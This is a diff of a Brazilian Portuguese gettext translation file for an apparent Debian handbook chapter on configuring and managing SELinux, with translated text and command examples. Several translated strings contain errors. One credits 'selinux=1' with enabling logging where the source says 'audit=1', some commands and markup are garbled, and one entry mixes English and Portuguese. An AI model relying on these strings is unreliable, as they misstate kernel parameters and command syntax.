@@ -5,8 +5,8 @@ msgid ""
 msgstr ""
 "Project-Id-Version: 0\n"
 "POT-Creation-Date: 2012-06-01T20:23:58\n"
-"PO-Revision-Date: 2012-08-03 01:05+0200\n"
-"Last-Translator: Fred Maranhão <fred.maranhao@gmail.com>\n"
+"PO-Revision-Date: 2012-08-04 12:37+0200\n"
+"Last-Translator: Willer Gomes Junior <willer@ogomes.com>\n"
 "Language-Team: Portuguese (Brazil) <http://debian.weblate.org/projects"
 "/debian-handbook/14_security/pt_BR/>\n"
 "Language: pt-BR\n"
@@ -2011,83 +2011,135 @@ msgid "The <emphasis role=\"pkg\">selinux-policy-default</emphasis> package cont
 msgstr ""
 "O pacote <emphasis role=\"pkg\">selinux-policy-default</emphasis> contém um "
 "conjunto de regras padrão. Por padrão, essa política só restringe o acesso a "
-"alguns serviços amplamente expostos. As sessões de usuários não são "
+"alguns serviços amplamente expostos. As sessões de usuários não está "
 "restritas e, portanto, é improvável que o SELinux iria bloquear as operações "
 "do usuário legítimo. No entanto, isso faz aumentar a segurança de serviços "
-"do sistema rodando na máquina. Para configurar uma política corresponde as "
-"antigas regras \"strict\", você só tem que desativar o módulo "
-"<literal>unconfined</literal> (gestão de módulos está detalhada ainda nesta "
+"do sistema rodando na máquina. Para configurar uma política corresponde à "
+"antigo regra \"strict\", você só tem que desativar o módulo "
+"<literal>unconfined</literal> (gestão de módulos é detalhada ainda nesta "
 "seção)."
 
 #. Tag: para
 #, no-c-format
 msgid "Once the policy has been installed, you should label all the available files (which means assigning them a type). This operation must be manually started with <command>fixfiles relabel</command>."
 msgstr ""
+"Uma vez que a política tenha sido instalada, você deve marcar todos os "
+"arquivos disponíveis (o que significa atribuir-lhes um tipo). Esta operação "
+"deve ser iniciada manualmente com <command>fixfiles relabel</command>."
 
 #. Tag: para
 #, no-c-format
 msgid "The SELinux system is now ready. To enable it, you should add the <literal>selinux=1</literal> parameter to the Linux kernel. The <literal>audit=1</literal> parameter enables SELinux logging which records all the denied operations. Finally, the <literal>enforcing=1</literal> parameter brings the rules into application: without it SELinux works in its default <emphasis>permissive</emphasis> mode where denied actions are logged but still executed. You should thus modify the GRUB bootloader configuration file to append the desired parameters. One easy way to do this is to modify the <literal>GRUB_CMDLINE_LINUX</literal> variable in <filename>/etc/default/grub</filename> and to run <command>update-grub</command>. SELinux will be active after a reboot."
 msgstr ""
+"O sistema SELinux agora está pronto. Para habilitá-lo, você deve adicionar o "
+"parâmetro <literal>selinux=1</literal> para o kernel de Linux. O parâmetro "
+"<literal>selinux=1</literal> habilita o log SELinux que registra todas as "
+"operações negadas. Finalmente, o parâmetro <literal>enforcing=1</literal> "
+"traz as regras para aplicação: sem ele SELinux funciona no modo padrão "
+"<emphasis>permissive</emphasis> onde as ações negadas são registradas, mas "
+"ainda executadA. Você deve, portanto, modificar o arquivo de configuração do "
+"GRUB para anexar os parâmetros desejados. Uma maneira fácil de fazer isso é "
+"modificar A variável   <literal>GRUB_CMDLINE_LINUX</literal> em "
+"<filename>/etc/default/grub</filename> e executar <command>update-"
+"grub</command>. SELinux estará ativo após uma reinicialização."
 
 #. Tag: para
 #, no-c-format
 msgid "It is worth noting that the <command>selinux-activate</command> script automates those operations and forces a labeling on next boot (which avoids new non-labeled files created while SELinux was not yet active and while the labeling was going on)."
 msgstr ""
+"É interessante notar que o script <command>selinux-activate</command> "
+"automatiza as operações e força uma rotulagem na próxima inicialização (o "
+"que evita criacao de novos arquivos não-rotulados enquanto o SELinux ainda "
+"não estiver ativo, e enquanto a rotulagem estiver acontecendo)."
 
 #. Tag: title
 #, no-c-format
 msgid "Managing an SELinux System"
-msgstr ""
+msgstr "Gerenciando um Sistema SELinux"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>semodule</command></primary>"
-msgstr ""
+msgstr "<primary><command>semodule</command></primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>semanage</command></primary>"
-msgstr ""
+msgstr "<primary><command>semanage</command></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The SELinux policy is a modular set of rules, and its installation detects and enables automatically all the relevant modules based on the already installed services. The system is thus immediately operational. However, when a service is installed after the SELinux policy, you must be able to manually enable the corresponding module. That is the purpose of the <command>semodule</command> command. Furthermore, you must be able to define the roles that each user can endorse, and this can be done with the <command>semanage</command> command."
 msgstr ""
+"A política do SELinux é um conjunto modular de regras, e sua instalação "
+"detecta e permite automaticamente todos os módulos relevantes com base nos "
+"serviços já instalados. O sistema é assim imediatamente operacional. No "
+"entanto, quando um serviço é instalado após a política do SELinux, você deve "
+"ser capaz de habilitar manualmente o módulo correspondente. Esse é o "
+"propósito do comando <command>semodule</command>. Além disso, você deve ser "
+"capaz de definir as funções que cada usuário pode endossar, e isso pode ser "
+"feito com o comando <command>semanage</command>."
 
 #. Tag: para
 #, no-c-format
 msgid "Those two commands can thus be used to modify the current SELinux configuration, which is stored in <filename>/etc/selinux/default/</filename>. Unlike other configuration files that you can find in <filename>/etc/</filename>, all those files must not be changed by hand. You should use the programs designed for this purpose."
 msgstr ""
+"Estes dois comandos podem assim ser usados ​​para modificar a atual "
+"configuração do SELinux, que é armazenada em "
+"<filename>/etc/selinux/default/</filename>. Ao contrário de outros arquivos "
+"de configuração que você pode encontrar em <filename>/etc/</filename>, todos "
+"esses arquivos não devem ser alterados manualmente. Você deve usar os "
+"programas concebidos para este proposito."
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>GOING FURTHER</emphasis> More documentation"
-msgstr ""
+msgstr "<emphasis>INDO ALEM</emphasis> Mais documentacao"
 
 #. Tag: para
 #, no-c-format
 msgid "Since the NSA doesn't provide any official documentation, the community set up a wiki to compensate. It brings together a lot of information, but you must be aware that most SELinux contributors are Fedora users (where SELinux is enabled by default). The documentation thus tends to deal specifically with that distribution. <ulink type=\"block\" url=\"http://www.selinuxproject.org\" />"
 msgstr ""
+"Uma vez que a NSA não fornece qualquer documentação oficial, a comunidade "
+"criou um wiki para compensar. Reúne uma série de informações, mas você deve "
+"estar ciente que os maiores contribuintes SELinux são usuários do Fedora "
+"(onde o SELinux está habilitado por padrão). A documentação, portanto, tende "
+"a tratar especificamente com essa distribuição. <ulink type=\"block\" "
+"url=\"http://www.selinuxproject.org\" />"
 
 #. Tag: para
 #, no-c-format
 msgid "You should also have a look at the dedicated Debian wiki page as well as Russel Coker's blog, who is one of the most active Debian developers working on SELinux support. <ulink type=\"block\" url=\"http://wiki.debian.org/SELinux\" /> <ulink type=\"block\" url=\"http://etbe.coker.com.au/tag/selinux/\" />"
 msgstr ""
+"Você também deve ter olhado para a página wiki dedicada ao Debian, bem como "
+"blog de Russel Coker, que é um dos desenvolvedores mais ativos do Debian "
+"trabalhando no suporte SELinux. <ulink type=\"block\" "
+"url=\"http://wiki.debian.org/SELinux\" /> <ulink tipo=\"block\" url = "
+"\"http://etbe.coker.com.au/tag/selinux/ \"/>"
 
 #. Tag: title
 #, no-c-format
 msgid "Managing SELinux Modules"
-msgstr ""
+msgstr "Gerenciando Modulos SELinux"
 
 #. Tag: para
 #, no-c-format
 msgid "Available SELinux modules are stored in the <filename>/usr/share/selinux/default/</filename> directory. To enable one of these modules in the current configuration, you should use <command>semodule -i <replaceable>module.pp</replaceable></command>. The <emphasis>pp</emphasis> extension stands for <emphasis>policy package</emphasis>."
 msgstr ""
+"Módulos SELinux disponíveis são armazenados no diretorio "
+"<filename>/usr/share/selinux/default/</filename>. Para habilitar um desses "
+"módulos na configuração atual, você deve usar <command>semodule-i "
+"<replaceable>module.pp</replaceable></command>. A extensão "
+"<emphasis>pp</emphasis> representa <emphasis>pacote política</emphasis>."
 
 #. Tag: para
 #, no-c-format
 msgid "Removing a module from the current configuration is done with <command>semodule -r <replaceable>module</replaceable></command>. Finally, the <command>semodule -l</command> command lists the modules which are currently enabled. It also outputs their version numbers."
 msgstr ""
+"A removecao de um módulo a partir da configuração atual é feita com "
+"<command>semodule -r <replaceable>module</replaceable></command>. "
+"Finalmente, o comando <command>semodule -l</command> listas os modulos que "
+"estao atualmente habilitados. Também mostra seus números de versão."
 
 #. Tag: screen
 #, no-c-format
@@ -2104,31 +2156,70 @@ msgid "<computeroutput># </computeroutput><userinput>semodule -i /usr/share/seli
 "[...]</computeroutput>\n"
 ""
 msgstr ""
+"<computeroutput># </computeroutput><userinput>semodule -i "
+"/usr/share/selinux/default/aide.pp</userinput>\n"
+"<computeroutput># </computeroutput><userinput>semodule -l</userinput>\n"
+"<computeroutput>aide    1.4.0\n"
+"apache  1.10.0\n"
+"apm     1.7.0\n"
+"[...]</computeroutput>\n"
+"<computeroutput># </computeroutput><userinput>semodule -r aide</userinput>\n"
+"<computeroutput># </computeroutput><userinput>semodule -l</userinput>\n"
+"<computeroutput>apache  1.10.0\n"
+"apm     1.7.0\n"
+"[...]</computeroutput>\n"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>semodule</command> immediately loads the new configuration unless you use its <literal>-n</literal> option. It is worth noting that the program acts by default on the current configuration (which is indicated by the <literal>SELINUXTYPE</literal> variable in <filename>/etc/selinux/config</filename>), but that you can modify another one by specifying it with the <literal>-s</literal> option."
 msgstr ""
+"<command>semodule</command> imediatamente carrega a nova configuração, a "
+"menos que você use sua opção <literal>-n </ literal>. É interessante notar "
+"que o programa atua por padrão na configuração atual (que é indicada pela "
+"variavel <literal>SELINUXTYPE</literal> em "
+"<filename>/etc/selinux/config</filename>), mas que você pode modificar "
+"outra, especificando-a com a opcao <literal>opção-s</literal>."
 
 #. Tag: title
 #, no-c-format
 msgid "Managing Identities"
-msgstr ""
+msgstr "Gerenciando Identidades"
 
 #. Tag: para
 #, no-c-format
 msgid "Every time that a user logs in, they get assigned an SELinux identity. This identity defines the roles that they will be able to endorse. Those two mappings (from the user to the identity and from this identity to roles) are configurable with the <command>semanage</command> command."
 msgstr ""
+"Toda vez que um usuário faz logon, eles se atribui uma identidade SELinux. "
+"Esta identidade define os papéis que eles serão capazes de endossar. Estes "
+"dois mapeamentos (do usuário para a identidade e de esta identidade para "
+"papéis) são configuráveis ​​com o comando <command>semanage</command>."
 
 #. Tag: para
 #, no-c-format
 msgid "You should definitely read the <citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry> manual page, even if the command's syntax tends to be similar for all the concepts which are managed. You will find common options to all sub-commands: <literal>-a</literal> to add, <literal>-d</literal> to delete, <literal>-m</literal> to modify, <literal>-l</literal> to list, and <literal>-t</literal> to indicate a type (or domain)."
 msgstr ""
+"Você deve definitivamente ler a página de manual "
+"<citerefentry>semanage<refentrytitle></refentrytitle><manvolnum> 8 "
+"</manvolnum></citerefentry>, mesmo se a sintaxe do comando tende a ser "
+"semelhante para todos os conceitos que são geridos. Você vai encontrar "
+"opções comuns a todos os sub-comandos: <literal>-a</literal> para adicionar, "
+"<literal>-d</ literal> para excluir, <literal>-m</literal> para modificar, "
+"<literal>-l</literal> para listar, e <literal>-t</literal> para indicar um "
+"tipo (ou domínio)."
 
 #. Tag: para
 #, no-c-format
 msgid "<command>semanage login -l</command> lists the current mapping between user identifiers and SELinux identities. Users that have no explicit entry get the identity indicated in the <literal>__default__</literal> entry. The <command>semanage login -a -s user_u <replaceable>user</replaceable></command> command will associate the <emphasis>user_u</emphasis> identity to the given user. Finally, <command>semanage login -d <replaceable>user</replaceable></command> drops the mapping entry assigned to this user."
 msgstr ""
+"<command>semanage login -l</command> lista o atual mapeamento entre "
+"identificadores de usuário e identidades SELinux. Os usuários que não têm "
+"entrada explícita obter a identidade indicado na entrada "
+"<literal>__default__</literal>. O comando <command>semanage login -a -s "
+"user_u <replaceable>user</replaceable></command> irá associar a identidade "
+"<emphasis>user_u</emphasis> ao determinado usuário. "
+"Finalmente,<command>semanage login -d "
+"<replaceable>user</replaceable></command> exclui a entrada de mapeamento "
+"atribuído a este usuário."
 
 #. Tag: screen
 #, no-c-format
@@ -2144,11 +2235,50 @@ msgid "<computeroutput># </computeroutput><userinput>semanage login -a -s user_u
 "# </computeroutput><userinput>semanage login -d rhertzog</userinput> \n"
 ""
 msgstr ""
+"<computeroutput># </computeroutput><userinput>semanage login -a -s user_u "
+"rhertzog</userinput>\n"
+"<computeroutput># </computeroutput><userinput>semanage login -l</userinput>\n"
+"<computeroutput>\n"
+"Login Name                SELinux User              MLS/MCS Range\n"
+"\n"
+"__default__               unconfined_u              s0-s0:c0.c1023\n"
+"rhertzog                  user_u                    None\n"
+"root                      unconfined_u              s0-s0:c0.c1023\n"
+"system_u                  system_u                  s0-s0:c0.c1023\n"
+"# </computeroutput><userinput>semanage login -d rhertzog</userinput> \n"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>semanage user -l</command> lists the mapping between SELinux user identities and allowed roles. Adding a new identity requires to define both the corresponding roles and a labeling prefix which is used to assign a type to personal files (<filename>/home/<replaceable>user</replaceable>/*</filename>). The prefix must be picked among <literal>user</literal>, <literal>staff</literal>, and <literal>sysadm</literal>. The “<literal>staff</literal>” prefix results in files of type “<literal>staff_home_dir_t</literal>”. Creating a new SELinux user identity is done with <command>semanage user -a -R <replaceable>roles</replaceable> -P <replaceable>prefix</replaceable> <replaceable>identity</replaceable></command>. Finally, you can remove an SELinux user identity with <command>semanage user -d <replaceable>identity</replaceable></command>."
 msgstr ""
+"<command>semanage user -l</command> lists the mapping between SELinux user "
+"identities and allowed roles. Adding a new identity requires to define both "
+"the corresponding roles and a labeling prefix which is used to assign a type "
+"to personal files "
+"(<filename>/home/<replaceable>user</replaceable>/*</filename>). The prefix "
+"must be picked among <literal>user</literal>, <literal>staff</literal>, and "
+"<literal>sysadm</literal>. The “<literal>staff</literal>” prefix results in "
+"files of type “<literal>staff_home_dir_t</literal>”. Creating a new SELinux "
+"user identity is done with <command>semanage user -a -R "
+"<replaceable>roles</replaceable> -P <replaceable>prefix</replaceable> "
+"<replaceable>identity</replaceable></command>. Finally, you can remove an "
+"SELinux user identity with <command>semanage user -d "
+"<replaceable>identity</replaceable></command>.\n"
+"\n"
+"<command>semanage user -l</command> lista o mapeamento entre as identidades "
+"de usuários do SELinux e papéis permitidos. Adicionar uma nova identidade "
+"requer definir os papéis correspondentes e um prefixo de marcação que é "
+"usado para designar um tipo de arquivo pessoal "
+"(<filename>/home/user<replaceable></replaceable>/*</filename>). O prefixo "
+"deve ser escolhido entre <literal>usuário</literal>, o "
+"<literal>pessoal</literal>, e o <literal>sysadm</literal>. O prefixo "
+"\"<literal>staff</literal>\" resulta de prefixo dos arquivos do tipo "
+"\"<literal>staff_home_dir_t</literal>\". Criar uma nova identidade de usuário "
+"SELinux é feita com <command>semanage usuário-a-R "
+"<replaceable>roles</replaceable>-P <replaceable>prefix</replaceable> "
+"<replaceable>identidade</replaceable></command>. Finalmente, você pode "
+"remover uma identidade de usuário SELinux com <command> semanage usuário -d "
+"<replaceable>identidade</replaceable></command>."
 
 #. Tag: screen
 #, no-c-format
@@ -2168,26 +2298,67 @@ msgid "<computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_
 "# </computeroutput><userinput>semanage user -d test_u</userinput>\n"
 ""
 msgstr ""
+"<computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r "
+"user_r' -P staff test_u</userinput>\n"
+"<computeroutput># </computeroutput><userinput>semanage user -l</userinput>\n"
+"<computeroutput>\n"
+"                Labeling   MLS/       MLS/\n"
+"SELinux User    Prefix     MCS Level  MCS Range        SELinux Roles\n"
+"\n"
+"root            sysadm     s0         s0-s0:c0.c1023   staff_r sysadm_r "
+"system_r\n"
+"staff_u         staff      s0         s0-s0:c0.c1023   staff_r sysadm_r\n"
+"sysadm_u        sysadm     s0         s0-s0:c0.c1023   sysadm_r\n"
+"system_u        user       s0         s0-s0:c0.c1023   system_r\n"
+"test_u          staff      s0         s0               staff_r user_r\n"
+"unconfined_u    unconfined s0         s0-s0:c0.c1023   system_r unconfined_r\n"
+"user_u          user       s0         s0               user_r\n"
+"# </computeroutput><userinput>semanage user -d test_u</userinput>\n"
 
 #. Tag: title
 #, no-c-format
 msgid "Managing File Contexts, Ports and Booleans"
-msgstr ""
+msgstr "Gerenciamento de arquivos Contextos, Portas e booleanos"
 
 #. Tag: para
 #, no-c-format
 msgid "Each SELinux module provides a set of file labeling rules, but it is also possible to add custom labeling rules to cater to a specific case. For example, if you want the web server to be able to read files within the <filename>/srv/www/</filename> file hierarchy, you could execute <command>semanage fcontext -a -t httpd_sys_content_t \"/srv/www(/.*)?\"</command> followed by <command>restorecon -R /srv/www/</command>. The former command registers the new labeling rules and the latter resets the file types according to the current labeling rules."
 msgstr ""
+"Cada módulo SELinux fornece um conjunto de regras de rotulagem de arquivos, "
+"mas também é possível adicionar regras de rotulagem personalizadas para "
+"atender a um caso específico. Por exemplo, se você deseja que o servidor web "
+"para seja capaz de ler arquivos dentro da hierarquia de arquivos "
+"<filename>/srv/www/</filename>, você pode executar semanage <command> "
+"fcontext-a-t httpd_sys_content_t \"/srv/www(/.*)? \"</command> seguido de "
+"<command> restorecon -R /srv/www/</command>. O comando anterior registra as "
+"novas regras de rotulagem e redefine o último dos tipos de arquivos de "
+"acordo com as atuais regras de rotulagem."
 
 #. Tag: para
 #, no-c-format
 msgid "Similarly, TCP/UDP ports are labeled in a way that ensures that only the corresponding daemons can listen to them. For instance, if you want that the web server be able to listen on port 8080, you should run <command>semanage port -m -t http_port_t -p tcp 8080</command>."
 msgstr ""
+"Da mesma forma, portas TCP/UDP são rotuladas de uma forma que garante que "
+"apenas os daemons correspondentes podem ouvi los. Por exemplo, se você "
+"quiser que o servidor web seja capaz de escutar na porta 8080, você deve "
+"executar <command>semanage porta -m -t http_port_t-p tcp 8080</command>."
 
 #. Tag: para
 #, no-c-format
 msgid "Some SELinux modules export boolean options that you can tweak to alter the behavior of the default rules. The <command>getsebool</command> utility can be used to inspect those options (<command>getsebool <replaceable>boolean</replaceable></command> displays one option, and <command>getsebool -a</command> them all). The <command>setsebool <replaceable>boolean</replaceable> <replaceable>value</replaceable></command> command changes the current value of a boolean option. The <literal>-P</literal> option makes the change permanent, it means that the new value becomes the default and will be kept across reboots. The example below grants web servers an access to home directories (this is useful when users have personal websites in <filename>~/public_html/</filename>)."
 msgstr ""
+"Alguns módulos do SELinux exportar opções booleanas que você pode alterar "
+"para alterar o comportamento das regras padrão. O utilitário "
+"<command>getsebool</command> pode ser usado para inspecionar as opções "
+"(<command>getsebool<replaceable>boolean</replaceable></command> exibe uma "
+"opção, e <command>getsebool -a</command> todas elas). O comando "
+"<command>setsebool <replaceable>boolean</replaceable> <replaceable>value</ "
+"replaceable></command> muda o valor atual de uma opção booleana. A opcao "
+"<literal>-P</literal> faz a mudança permanente, isso significa que o novo "
+"valor passa a ser o padrão e será mantido entre as reinicializações. O "
+"exemplo abaixo servidores web concede acesso para diretórios home (isto é "
+"útil quando os usuários têm sites pessoais em "
+"<filename>~/public_html/</filename>)."
 
 #. Tag: screen
 #, no-c-format
@@ -2198,21 +2369,39 @@ msgid "<computeroutput># </computeroutput><userinput>getsebool httpd_enable_home
 "<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput>\n"
 ""
 msgstr ""
+"<computeroutput># </computeroutput><userinput>getsebool "
+"httpd_enable_homedirs</userinput>\n"
+"<computeroutput>httpd_enable_homedirs --&gt; off\n"
+"# </computeroutput><userinput>setsebool -P httpd_enable_homedirs "
+"on</userinput>\n"
+"<computeroutput># </computeroutput><userinput>getsebool "
+"httpd_enable_homedirs</userinput> \n"
+"<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput>\n"
 
 #. Tag: title
 #, no-c-format
 msgid "Adapting the Rules"
-msgstr ""
+msgstr "Adaptando as Regras"
 
 #. Tag: para
 #, no-c-format
 msgid "Since the SELinux policy is modular, it might be interesting to develop new modules for (possibly custom) applications that lack them. These new modules will then complete the <emphasis>reference policy</emphasis>."
 msgstr ""
+"Uma vez que a política do SELinux é modular, pode ser interessante para "
+"desenvolver novos módulos para (possivelmente personalizar) aplicações que "
+"não os possuem. Estes novos módulos, então, completarao a <emphasis>política "
+"de referência</emphasis>."
 
 #. Tag: para
 #, no-c-format
 msgid "To create new modules, the <emphasis role=\"pkg\">selinux-policy-dev</emphasis> package is required, as well as <emphasis role=\"pkg\">selinux-policy-doc</emphasis>. The latter contains the documentation of the standard rules (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) and sample files that can be used as templates to create new modules. Install those files and study them more closely:"
 msgstr ""
+"Para criar novos módulos, o pacote <emphasis role=\"pkg\">selinux-policy-"
+"dev</emphasis> é necessário, bem como  <emphasis role=\"pkg\">selinux-policy-"
+"doc</emphasis>. Este último contém a documentação das regras padrão "
+"(<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) da amostra e "
+"arquivos que podem ser usados ​​como modelos para criar novos módulos. "
+"Instale estes arquivos e os estude mais de perto:"
 
 #. Tag: screen
 #, no-c-format
@@ -2222,26 +2411,46 @@ msgid "<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux
 "<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput>\n"
 ""
 msgstr ""
+"<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-"
+"policy-doc/Makefile.example.gz &gt;Makefile</userinput>\n"
+"<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-"
+"policy-doc/example.fc.gz &gt;example.fc</userinput>\n"
+"<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-"
+"policy-doc/example.if.gz &gt;example.if</userinput>\n"
+"<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-"
+"policy-doc/example.te ./</userinput>\n"
 
 #. Tag: para
 #, no-c-format
 msgid "The <filename>.te</filename> file is the most important one. It defines the rules. The <filename>.fc</filename> file defines the “file contexts”, that is the types assigned to files related to this module. The data within the <filename>.fc</filename> file are used during the file labeling step. Finally, the <filename>.if</filename> file defines the interface of the module: it's a set of “public functions” that other modules can use to properly interact with the module that you're creating."
 msgstr ""
+"O arquivo <filename>.te</filename> é o mais importante. Ele define as "
+"regras. O arquivo <filename>.fc</filename> define os arquivos de contextos\", "
+"isto é, os tipos atribuídos a arquivos relacionados a este módulo. Os dados "
+"dentro do arquivo <filename>.fc</filename> são utilizados durante a etapa "
+"de rotulagem do arquivo. Finalmente, o arquivo <filename>if</filename> "
+"define a interface do módulo:. É um conjunto de \"funções públicas\" que "
+"outros módulos podem usar ​​para interagir adequadamente com o módulo que "
+"você está criando."
 
 #. Tag: title
 #, no-c-format
 msgid "Writing a <filename>.fc</filename> file"
-msgstr ""
+msgstr "Escrevendo um arquivo <filename>.fc</filename>"
 
 #. Tag: para
 #, no-c-format
 msgid "Reading the below example should be sufficient to understand the structure of such a file. You can use regular expressions to assign the same security context to multiple files, or even an entire directory tree."
 msgstr ""
+"Lendo o exemplo a seguir deve ser suficiente para compreender a estrutura de "
+"tal arquivo. Você pode usar expressões regulares para atribuir o mesmo "
+"contexto de segurança de vários arquivos, ou até mesmo uma árvore de "
+"diretórios."
 
 #. Tag: title
 #, no-c-format
 msgid "<filename>example.fc</filename> file"
-msgstr ""
+msgstr "arquivo <filename>example.fc</filename>"
 
 #. Tag: programlisting
 #, no-c-format
@@ -2253,26 +2462,44 @@ msgid "# myapp executable will have:\n"
 "/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)\n"
 ""
 msgstr ""
+"# myapp executavel tera:\n"
+"# label: system_u:object_r:myapp_exec_t\n"
+"# MLS sensibilidade: s0\n"
+"# MCS categorias: &lt;nenhuma&gt;\n"
+"\n"
+"/usr/sbin/myapp         --      "
+"gen_context(system_u:object_r:myapp_exec_t,s0)\n"
 
 #. Tag: title
 #, no-c-format
 msgid "Writing a <filename>.if</filename> File"
-msgstr ""
+msgstr "Escrevendo um arquivo <filename>.if</filename>"
 
 #. Tag: para
 #, no-c-format
 msgid "In the sample below, the first interface (“<literal>myapp_domtrans</literal>”) controls who can execute the application. The second one (“<literal>myapp_read_log</literal>”) grants read rights on the application's log files."
 msgstr ""
+"No exemplo abaixo, a primeira interface "
+"(\"<literal>myapp_domtrans</literal>\") controla quem pode executar o "
+"aplicativo. O segundo (\"<literal>myapp_read_log</literal>\") concede direitos "
+"de leitura nos arquivos de log do aplicativo."
 
 #. Tag: para
 #, no-c-format
 msgid "Each interface must generate a valid set of rules which can be embedded in a <filename>.te</filename> file. You should thus declare all the types that you use (with the <literal>gen_require</literal> macro), and use standard directives to grant rights. Note, however, that you can use interfaces provided by other modules. The next section will give more explanations about how to express those rights."
 msgstr ""
+"Cada interface deve gerar um conjunto válido de regras que podem ser "
+"incorporadas em um arquivo <filename>.te</filename>. Você deve, portanto, "
+"declarar todos os tipos que você utiliza (com a macro "
+"<literal>gen_require</literal>), e usar diretivas padrão de concessão de "
+"direitos. Note, no entanto, que você pode usar interfaces fornecidas por "
+"outros módulos. A próxima seção irá dar mais explicações sobre a forma de "
+"expressar esses direitos."
 
 #. Tag: title
 #, no-c-format
 msgid "<filename>example.if</filename> File"
-msgstr ""
+msgstr "Arquivo <filename>example.if</filename>"
 
 #. Tag: programlisting
 #, no-c-format
@@ -2328,46 +2555,117 @@ msgid "## &lt;summary&gt;Myapp example policy&lt;/summary&gt;\n"
 "')\n"
 ""
 msgstr ""
+"## &lt;summary&gt;Myapp exemple de politica&lt;/summary&gt;\n"
+"## &lt;desc&gt;\n"
+"##      &lt;p&gt;\n"
+"##              Mais um texto descritivo sobre myapp.  A tag &lt;desc&gt;\n"
+"##              tambem pode usar &lt;p&gt;, &lt;ul&gt;, e &lt;ol&gt;\n"
+"##              tags html para formatacao;\n"
+"##      &lt;/p&gt;\n"
+"##      &lt;p&gt;\n"
+"##              Esta politica suporta as seguintes myapp caracteristicas:\n"
+"##              &lt;ul&gt;\n"
+"##              &lt;li&gt;Caracteristica A&lt;/li&gt;\n"
+"##              &lt;li&gt;Caracteristica B&lt;/li&gt;\n"
+"##              &lt;li&gt;Caracteristica C&lt;/li&gt;\n"
+"##              &lt;/ul&gt;\n"
+"##      &lt;/p&gt;\n"
+"## &lt;/desc&gt;\n"
+"#\n"
+"\n"
+"########################################\n"
+"## &lt;sumario&gt;\n"
+"##      Executar uma transição de domínio para executar myapp.\n"
+"## &lt;/sumario&gt;\n"
+"## &lt;param name=\"domain\"&gt;\n"
+"##      Domínio permitiu a transição.\n"
+"## &lt;/param&gt;\n"
+"#\n"
+"interface(`myapp_domtrans',`\n"
+"        gen_require(`\n"
+"                type myapp_t, myapp_exec_t;\n"
+"        ')\n"
+"\n"
+"        domtrans_pattern($1,myapp_exec_t,myapp_t)\n"
+"')\n"
+"\n"
+"########################################\n"
+"## &lt;summary&gt;\n"
+"##      Ler arquivos de log myapp.\n"
+"## &lt;/summary&gt;\n"
+"## &lt;param name=\"domain\"&gt;\n"
+"##      Domínio permitiu ler os arquivos de log.\n"
+"## &lt;/param&gt;\n"
+"#\n"
+"interface(`myapp_read_log',`\n"
+"        gen_require(`\n"
+"                type myapp_log_t;\n"
+"        ')\n"
+"\n"
+"        logging_search_logs($1)\n"
+"        allow $1 myapp_log_t:file r_file_perms;\n"
+"')\n"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>DOCUMENTATION</emphasis> Explanations about the <emphasis>reference policy</emphasis>"
 msgstr ""
+"<emphasis>DOCUMENTACAO</emphasis> Explicações sobre a <emphasis>política de "
+"referência</emphasis>"
 
 #. Tag: para
 #, no-c-format
 msgid "The <emphasis>reference policy</emphasis> evolves like any free software project: based on volunteer contributions. The project is hosted by Tresys, one of the most active companies in the SELinux field. Their wiki contains explanations on how the rules are structured and how you can create new ones. <ulink type=\"block\" url=\"http://oss.tresys.com/projects/refpolicy/wiki/GettingStarted\" />"
 msgstr ""
+"A <emphasis>política de referência</emphasis> evolui como qualquer projeto "
+"de software livre: baseado em contribuições voluntárias. O projeto é "
+"hospedado pelo Tresys, uma das empresas mais ativas no domínio SELinux. Sua "
+"wiki contém explicações sobre como as regras são estruturadas e como você "
+"pode criar novas. <ulink type=\"block\" "
+"url=\"http://oss.tresys.com/projects/refpolicy/wiki/GettingStarted\" />"
 
 #. Tag: title
 #, no-c-format
 msgid "Writing a <filename>.te</filename> File"
-msgstr ""
+msgstr "Escrevendo um Arquivo <filename>.te</filename>"
 
 #. Tag: para
 #, no-c-format
 msgid "Have a look at the <filename>example.te</filename> file:"
-msgstr ""
+msgstr "De uma olhada no arquivo <filename>example.te</filename>:"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>GOING FURTHER</emphasis> The <command>m4</command> macro language"
 msgstr ""
+"<emphasis>INDO ALEM</emphasis> A linguagem de macro <command>m4</command>"
 
 #. Tag: para
 #, no-c-format
 msgid "To properly structure the policy, the SELinux developers used a macro-command processor. Instead of duplicating many similar <emphasis>allow</emphasis> directives, they created “macro functions” to use a higher-level logic, which also results in a much more readable policy."
 msgstr ""
+"Para estruturar adequadamente a política, os desenvolvedores do SELinux "
+"utilizado um processador de comandos macro. Em vez de duplicar varios "
+"diretivas de permissoes <emphasis>similares</emphasis>,  eles criaram "
+"\"funções macro\", para usar uma lógica de alto nível, o que também resulta em "
+"uma política muito mais legível."
 
 #. Tag: para
 #, no-c-format
 msgid "In practice, <command>m4</command> is used to compile those rules. It does the opposite operation: it expands all those high-level directives into a huge database of <emphasis>allow</emphasis> directives."
 msgstr ""
+"Na prática, <command>m4</command> é usado para compilar essas regras. Ele "
+"faz a operação inversa: ele expande todas estas directivas de alto nível em "
+"um enorme banco de dados de diretivas de <emphasis>permissoes</emphasis>."
 
 #. Tag: para
 #, no-c-format
